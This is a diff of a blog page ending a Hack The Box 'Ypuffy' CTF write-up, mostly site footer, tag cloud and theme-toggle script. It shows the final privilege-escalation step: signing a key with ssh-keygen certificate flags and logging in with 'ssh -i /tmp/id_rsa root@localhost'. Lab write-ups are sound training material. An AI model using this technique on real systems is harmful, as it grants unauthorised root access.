-<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
-<h4 id="thanks-for-reading">Thanks for reading.</h4>
-<p><br />
-<br /></p>
-<h4 id="previous-hack-the-box-write-up--hack-the-box---dab">Previous Hack The Box write-up : <a href="/hack-the-box/dab/">Hack The Box - Dab</a></h4>
-<h4 id="next-hack-the-box-write-up--hack-the-box---giddy">Next Hack The Box write-up : <a href="/hack-the-box/giddy/">Hack The Box - Giddy</a></h4>
+<img src="/images/hackthebox/ypuffy/20.png" alt="" />
+<br /> <code class="highlighter-rouge">-s</code> for certificate , <code class="highlighter-rouge">-I</code> for identity and <code class="highlighter-rouge">-n</code> for principal
+<br /> Finally we will ssh as root :
+<code class="highlighter-rouge">ssh -i /tmp/id_rsa root@localhost</code>
+<img src="/images/hackthebox/ypuffy/21.png" alt="" />
+<br /> And we owned root !
+<br />
+<br />
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/dab/">Hack The Box - Dab</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/giddy/">Hack The Box - Giddy</a></p>
 <hr />
 
 
-  </div>
-<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/ypuffy/" hidden></a>
-</article>
-
-      </div>
-    </main><footer class="site-footer h-card">
-  <data class="u-url" href="/"></data>
-
-  <div class="wrapper">
-
-    <h2 class="footer-heading">0xRick Owned Root !</h2>
-
-    <div class="footer-col-wrapper">
-      <div class="footer-col footer-col-1">
-        <ul class="contact-list">
-          <li class="p-name">0xRick Owned Root !</li></ul>
-      </div>
-
-      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
 </div>
 
-      <div class="footer-col footer-col-3">
-        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+
+
+
+
+<div class="related">
+  <h2>other posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/pwn/collision/">
+            pwnable.kr - collision
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/unattended/">
+            Hack The Box - Unattended
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/helpline/">
+            Hack The Box - Helpline
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-3">binary-exploitation</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/exploit-development/" class="set-1">exploit development</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-5">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
       </div>
-    </div>
+    </main><footer class="site-footer">
+	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
+  <div class="wrapper"><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
 
+if (theme === "dark") {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+} else if (theme === "light") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+} else if  (userPrefers === "dark") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'dark');
+	document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	window.localStorage.setItem('theme', 'dark');
+	document.getElementById("theme-toggle").className = 'light';
+} else {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'light');
+	document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	window.localStorage.setItem('theme', 'light');
+	document.getElementById("theme-toggle").className = 'dark';
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    document.documentElement.setAttribute('data-theme', 'light');
+		document.documentElement.classList.add('theme--light');
+        document.documentElement.classList.remove('theme--dark');
+		window.localStorage.setItem('theme', 'light');
+	    document.getElementById("theme-toggle").className = 'dark';
+	} else {
+	    document.documentElement.setAttribute('data-theme', 'dark');
+		document.documentElement.classList.add('theme--dark');
+        document.documentElement.classList.remove('theme--light');
+		window.localStorage.setItem('theme', 'dark');
+	    document.getElementById("theme-toggle").className = 'light';
+	}
+}
+</script></div>
   </div>
-
 </footer>
-</body>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
 
 </html>
-
